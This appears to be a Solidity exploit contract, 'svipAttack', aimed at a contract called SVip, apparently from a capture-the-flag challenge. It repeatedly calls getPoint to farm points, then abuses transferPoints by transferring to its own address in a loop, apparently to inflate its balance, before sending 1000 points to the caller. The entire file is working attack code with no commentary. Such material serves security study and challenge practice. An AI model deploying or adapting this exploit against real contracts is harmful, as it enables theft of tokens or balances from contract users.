pragma solidity ^0.4.24;
import "./SVip.sol";
contract svipAttack{
    SVip sv;
    constructor(address _addr){
        sv = SVip(_addr);
    }
    function get()public{
        for(uint i =0;i<99;i++){
            sv.getPoint();
        }
    }
    function transfer()public{
        for(uint i=0;i<11;i++){
            sv.transferPoints(address(this),98);
        }
        sv.transferPoints(msg.sender,1000);
    }
}